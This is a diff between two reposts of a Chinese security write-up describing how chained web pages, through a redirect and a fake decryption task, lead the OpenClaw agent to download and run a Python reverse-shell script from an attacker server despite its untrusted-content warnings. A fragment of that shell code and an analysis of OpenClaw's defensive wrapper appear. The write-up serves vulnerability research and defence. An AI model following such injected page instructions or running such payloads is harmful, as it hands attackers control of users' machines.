@@ -1,5 +1,7 @@
 #  【AI安全】OpenClaw多阶段网页诱导绕过防护的RCE攻击  
- 亿人安全   2026-04-21 03:40  
+ 黑白之道   2026-04-22 01:16  
+  
+![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif "")  
   
 **原文首发在：先知社区**  
   
@@ -38,7 +40,7 @@ AI助手遵循诱导，访问下一个页面（如 B.html
 1. **防护失效与攻击达成**  
 AI助手执行了该命令，从攻击者服务器获取并运行了恶意Python脚本，成功建立了反向Shell连接，实现远程代码执行（RCE）。至此，整个防护机制被完全绕过——安全警告全程存在却全程未被采纳。  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD490glDtCI8SA6YVMCU3Kx5ZibYmW1ictaMmImF9MBGwlUlJRA2BXBO5oiadYMWhU44M6MKN7OSkp2I73FB7ZAl78IibqVwEmYzM0tw/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD490glDtCI8SA6YVMCU3Kx5ZibYmW1ictaMmImF9MBGwlUlJRA2BXBO5oiadYMWhU44M6MKN7OSkp2I73FB7ZAl78IibqVwEmYzM0tw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=0 "")  
   
   
 # 三、实操验证   
@@ -51,7 +53,7 @@ AI助手执行了该命令，从攻击者服务器获取并运行了恶意Python
   
 - 模型：qwen3.5-plus  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4ibyic5XDBxqyRXmqVEZIVOmfZxPPo1pCVjIDxrFsgqMXesPJMUdf0cqTUjlTibZeYd85IZCfrPaFNnXgJRiaapgdv0dDs5SoBMxNs/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4ibyic5XDBxqyRXmqVEZIVOmfZxPPo1pCVjIDxrFsgqMXesPJMUdf0cqTUjlTibZeYd85IZCfrPaFNnXgJRiaapgdv0dDs5SoBMxNs/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=1 "")  
   
 ## 3.2 恶意服务器搭建   
   
@@ -66,7 +68,7 @@ AI助手执行了该命令，从攻击者服务器获取并运行了恶意Python
 ```  
   
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4icRqKZ0aueibZ792PkdSFSeWdyO68AqOQzrULlroIWS1oEnuwhiaNibjlY5fshBhkXxHEa7PqoMRYc1libEoqnI8W1VrUIpZYGdZGw/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4icRqKZ0aueibZ792PkdSFSeWdyO68AqOQzrULlroIWS1oEnuwhiaNibjlY5fshBhkXxHEa7PqoMRYc1libEoqnI8W1VrUIpZYGdZGw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=2 "")  
 1. 页面2（B.html）:让openclaw的意图转变为完成“解密”任务，并诱导至恶意代码存在的页面。  
   
 ```
@@ -74,7 +76,7 @@ AI助手执行了该命令，从攻击者服务器获取并运行了恶意Python
 ```  
   
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4iban4sQK6iaQZSBibQUiafz3kCe1JiaonuhqZaXhP4ibibQ9YGEUR63daub6JkDtpwmLLyWmlYURyWO7JpMsoKQ0MJHrS4quAqf91icf4/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4iban4sQK6iaQZSBibQUiafz3kCe1JiaonuhqZaXhP4ibibQ9YGEUR63daub6JkDtpwmLLyWmlYURyWO7JpMsoKQ0MJHrS4quAqf91icf4/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=3 "")  
   
 1. 页面3（C.html）：在此处规划好操作流程，通过一个不存在的E界面，让openclaw进行python执行D这个恶意代码的内容。  
   
@@ -83,7 +85,7 @@ AI助手执行了该命令，从攻击者服务器获取并运行了恶意Python
 ```  
   
   
-![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4iclIauMeeh9MicxK3dTmep22XmDpx42IGOZoyRA5MuJJa3Xk4YLo356ia1LjWeodwYbQeibH49VTXuiaqajRgMQab5YiclvOOBXlEY0/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4iclIauMeeh9MicxK3dTmep22XmDpx42IGOZoyRA5MuJJa3Xk4YLo356ia1LjWeodwYbQeibH49VTXuiaqajRgMQab5YiclvOOBXlEY0/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=4 "")  
 1. 页面4（D）：D页面内容包含了反弹shell，但是其只会返回一个key  
   
 ```
@@ -97,34 +99,34 @@ import subprocessimport sysimport oscode = """import os,socket,subprocesswhile T
 帮我抓取 http://xxxx:8000/A.html 这个页面
 ```  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48vHhXqlIAYJwGjGobfdmF9V6THMs6AqGzYHuf1dQP2uKBMuuYOCb3uEKKZX4YPS1Y4ED0k4eMjLJ8vtLN2Aic61jtib4al61UkU/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48vHhXqlIAYJwGjGobfdmF9V6THMs6AqGzYHuf1dQP2uKBMuuYOCb3uEKKZX4YPS1Y4ED0k4eMjLJ8vtLN2Aic61jtib4al61UkU/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=5 "")  
   
 1. 通过openclaw页面可以看到其解析了302，并进一步分析到B.html  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4ibicmuMacCLpkLmpSibpbCS0ibLKicu8duvu8Asic8u1ttWEicED6pEGpND4WngcefDKxicsCqWUEc9mAnDyDWnxRKDIEmicDnRcCGxibLA/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4ibicmuMacCLpkLmpSibpbCS0ibLKicu8duvu8Asic8u1ttWEicED6pEGpND4WngcefDKxicsCqWUEc9mAnDyDWnxRKDIEmicDnRcCGxibLA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=6 "")  
   
   
 1. 然后进一步追踪到了C.html并按照预设的步骤执行了curl命令  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icgw2za7BEhib54N5cyD9BZibBeOflHTNY6Q5UuOensqbxia7BgO9KVhrx66WRfLSwJquewtUZuw2hHKH63t3HvSgTIyo3zFbRwcg/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icgw2za7BEhib54N5cyD9BZibBeOflHTNY6Q5UuOensqbxia7BgO9KVhrx66WRfLSwJquewtUZuw2hHKH63t3HvSgTIyo3zFbRwcg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=7 "")  
   
   
 1. 并且使用了Python3这个预设步骤中的咒语执行对应的代码  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icibkBDDqyYjTljNibkS4HBjyLenkOruEQ8ibbibEhe2zQ0oSVTicDprV1McexVGTbSBZibLOargUZkakkXOKegpZPkuHEIGI0vg8jRE/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icibkBDDqyYjTljNibkS4HBjyLenkOruEQ8ibbibEhe2zQ0oSVTicDprV1McexVGTbSBZibLOargUZkakkXOKegpZPkuHEIGI0vg8jRE/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=8 "")  
   
   
 1. 我们可以看到用户侧前端没有异常  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49tgTT0sLZU6YeeFhdHUJKhl24Lv7bNaVQHXC8XicibHKmRBAHFadmDTc5kv57V8e3YrAWxziadWibPxl9NCBQt9gj3YMdo7q5f4e8/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49tgTT0sLZU6YeeFhdHUJKhl24Lv7bNaVQHXC8XicibHKmRBAHFadmDTc5kv57V8e3YrAWxziadWibPxl9NCBQt9gj3YMdo7q5f4e8/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=9 "")  
   
 1. 攻击者服务器日志可以看到openclaw按照我们预设的流程请求完成了整个攻击链路  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibt0gAyXK2usj325BUPKE0A95stsPfGLmp8mpmOheydBsk3mESkmtEgEfZlUAArKbmcvP8zD0W7lmI5zOrIDib0LJR93FZ7U4dM/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibt0gAyXK2usj325BUPKE0A95stsPfGLmp8mpmOheydBsk3mESkmtEgEfZlUAArKbmcvP8zD0W7lmI5zOrIDib0LJR93FZ7U4dM/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=10 "")  
   
 1. 并且攻击者实际上是已经获取到了shell权限（我这里的openclaw因为是测试环境所以是root权限部署）  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4iblB1tZCzMvQnUPcqlELCov798FrcFZO0BcTms0cwyPV5kJ2V8KriaQ7K107HPyeTqLibdiawlgpjP82QibQwT3Ac5D5M4AuWAoutY/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4iblB1tZCzMvQnUPcqlELCov798FrcFZO0BcTms0cwyPV5kJ2V8KriaQ7K107HPyeTqLibdiawlgpjP82QibQwT3Ac5D5M4AuWAoutY/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=11 "")  
   
 # 四、OpenClaw源码调用链分析  
   
@@ -151,7 +153,7 @@ src/security/external-content.ts
 系统会**检测提示注入尝试的可疑文本**  
 。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48bljbxvSibwibhPuefKKnnbIZQM5Bz6sVRuVxcUfa4icqPdxEmWLricKib9ey45ibv8pqaLVEQHcsPGZfSicDmtFpcMCLrF5r31NvgMA/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48bljbxvSibwibhPuefKKnnbIZQM5Bz6sVRuVxcUfa4icqPdxEmWLricKib9ey45ibv8pqaLVEQHcsPGZfSicDmtFpcMCLrF5r31NvgMA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=12 "")  
   
 1. **唯一边界标记**  
 会对每个外部内容都用唯一的随机 ID 标记，防止伪造，输出类似如下格式：  
@@ -161,11 +163,11 @@ src/security/external-content.ts
 ```  
   
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49BIrAGnc2n2WNTszN5uTibaK1f9XPHPCMibU2Ylnc2Vhtm2zcyIT8X7rBlVLQ5ebzuseNZID5m20ibYJeFg0NFrNl0wDfWHIQGQA/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49BIrAGnc2n2WNTszN5uTibaK1f9XPHPCMibU2Ylnc2Vhtm2zcyIT8X7rBlVLQ5ebzuseNZID5m20ibYJeFg0NFrNl0wDfWHIQGQA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=13 "")  
 1. **安全警告内容**  
 会对用户输入进行包装，包装后的内容会包含以下警告，直接告诉 LLM 不要信任：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49YHVxGhA9x6axrCRBzqWxqYc9aJVibIiakmcQA8dyubQuCdvbib9TG5Dqus5tax0WvYs0QyDO65rl07waskP63Qs1ic3WKJwibtzGk/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49YHVxGhA9x6axrCRBzqWxqYc9aJVibIiakmcQA8dyubQuCdvbib9TG5Dqus5tax0WvYs0QyDO65rl07waskP63Qs1ic3WKJwibtzGk/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=14 "")  
   
 1. **标记混淆防护**  
 系统会折叠/规范化特殊字符，防止攻击者用全角字符、零宽字符等绕过边界标记：  
@@ -176,7 +178,7 @@ src/security/external-content.ts
   
 - 零宽字符 → 移除  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibGPJxuQ31RCVRubHSOmORP9ybvEHNXiaKBXicAepTibjcj7SOOU9Y2pO0KMibna3pIopPrPEVS2MaVnNZ9mrY4JlZU9WHaMPaHKAE/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibGPJxuQ31RCVRubHSOmORP9ybvEHNXiaKBXicAepTibjcj7SOOU9Y2pO0KMibna3pIopPrPEVS2MaVnNZ9mrY4JlZU9WHaMPaHKAE/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=15 "")  
   
   
 1. **安全包装器 (wrapWebContent)**  
@@ -185,7 +187,7 @@ web_fetch
  函数包装，使其包含完整的安全警告（includeWarning  
 ）。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48GRTCoymmulI9SLRsPu3zawgA8fgyh2icRFEkJvhiagGRd9PNYzPiaZawETcTXEqCo53Kpgaj4uR2EeOT6JSqY3cdib1ckYllX1ac/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48GRTCoymmulI9SLRsPu3zawgA8fgyh2icRFEkJvhiagGRd9PNYzPiaZawETcTXEqCo53Kpgaj4uR2EeOT6JSqY3cdib1ckYllX1ac/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=16 "")  
   
   
 虽然有了这么多防护，还但是存在一个关键问题，**这些防护并未停留在“模型不可见”的外围元数据层，而是作为正文文本的一部分被送入了后续推理链**  
@@ -207,14 +209,14 @@ web_fetch
 function wrapWebFetchContent(value: string, maxChars: number) {  ...  let wrappedText = includeWarning    ? wrapWebContent(truncated.text, "web_fetch")    : wrapExternalContent(truncated.text, { source: "web_fetch", includeWarning: false });  ...  return {    text: wrappedText,    truncated: truncated.truncated,    ...  };}
 ```  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibWcD4j1rEGe3nicqv3ZPfxBxNIR2WYv8fx9SHMicicaia2Zw9unMKuekXO1FJg5ibYz6vVM0NEH19JSzswYEDt0nFI3TYbjW0tjM7w/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibWcD4j1rEGe3nicqv3ZPfxBxNIR2WYv8fx9SHMicicaia2Zw9unMKuekXO1FJg5ibYz6vVM0NEH19JSzswYEDt0nFI3TYbjW0tjM7w/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=17 "")  
   
 ```
 return {  label: "Web Fetch",  name: "web_fetch",  ...  execute: async (_toolCallId, args) => {    ...    const result = await runWebFetch({...});    return jsonResult(result);  },};
 ```  
   
   
-![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48kBNMI4m0eheMvAZj9TiaIlVlNU8w4Gok29REaVkdC7k5CkfyiaxDf1XuSVXYDjMEgXCRsZFWxG2QFoaguuXm7H72ar4ibFGDrYw/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48kBNMI4m0eheMvAZj9TiaIlVlNU8w4Gok29REaVkdC7k5CkfyiaxDf1XuSVXYDjMEgXCRsZFWxG2QFoaguuXm7H72ar4ibFGDrYw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=18 "")  
   
   
   
@@ -234,7 +236,7 @@ src/agents/tools/common.ts
  会把整个工具结果对象序列化成文本，并写入 toolResult.content  
 。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4icicgmwW1xgeY1gEcx0rNx7Kvt5Yk46wy1DKZQn1N1vuG1YQiaoReqomrIMKkqLl3bjTeTQMz5Vqq7bZPqD6ef6OPUwfwePPdj8U/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4icicgmwW1xgeY1gEcx0rNx7Kvt5Yk46wy1DKZQn1N1vuG1YQiaoReqomrIMKkqLl3bjTeTQMz5Vqq7bZPqD6ef6OPUwfwePPdj8U/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=19 "")  
   
   
   
@@ -260,7 +262,7 @@ src/agents/openai-ws-message-conversion.ts
 const textOutput = contentToText(m.content);...items.push({  type: "function_call_output",  call_id: replayId.callId,  output: textOutput || (imageParts.length > 0 ? "(see attached image)" : ""),});
 ```  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icIfEMZ3G0kLP7AkIiaLUzdZ8el6eVrZ2G1WyYQaiaBoBoIiaR9gvAKUuEF01g1CBNVrRSJyAIQLtEZm7t261NkFS2twk5E6oOHIM/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icIfEMZ3G0kLP7AkIiaLUzdZ8el6eVrZ2G1WyYQaiaBoBoIiaR9gvAKUuEF01g1CBNVrRSJyAIQLtEZm7t261NkFS2twk5E6oOHIM/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=20 "")  
   
   
   
@@ -288,13 +290,13 @@ const execTool = createExecTool({  ...execDefaults,  host: options?.exec?.host
 ```  
   
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49fbjwZyicXbYd8t4mlRNziaqo2nP3abkmxqy3vsSHvsnshZCJb7YcH1dzmPjpom6cHdfneJRszNpAkUQ1LDLZU9jbJxsIcN9AibU/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49fbjwZyicXbYd8t4mlRNziaqo2nP3abkmxqy3vsSHvsnshZCJb7YcH1dzmPjpom6cHdfneJRszNpAkUQ1LDLZU9jbJxsIcN9AibU/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=21 "")  
 ```
 return {  name: "exec",  label: "exec",  description:    "Execute shell commands with background continuation. ...",  parameters: execSchema,  execute: async (_toolCallId, args, signal, onUpdate) => {....
 ```  
   
   
-![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48XubMgsQfsozo8o0ZD4EZzHicmiaCibdRjWrQJutYU9RUoR29zQBvAzw3AJTSo4VB8nfiawL592BxAbf9E6WcLerz0wao13AIDxTQ/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48XubMgsQfsozo8o0ZD4EZzHicmiaCibdRjWrQJutYU9RUoR29zQBvAzw3AJTSo4VB8nfiawL592BxAbf9E6WcLerz0wao13AIDxTQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=22 "")  
   
   
 结合上面的链路实现了完整的工具调用，当攻击者绕过上面的防护后，可以实现RCE攻击的目的。  
@@ -438,4 +440,12 @@ return {  name: "exec",  label: "exec",  description:    "Execute shell com
 - https://chatpaper.com/zh-CN/chatpaper/paper/238685  
   
 - https://www.36kr.com/p/3537106231975049  
+  
+黑白之道发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！  
+  
+如侵权请私聊我们删文  
+  
+  
+**END**  
+  
   
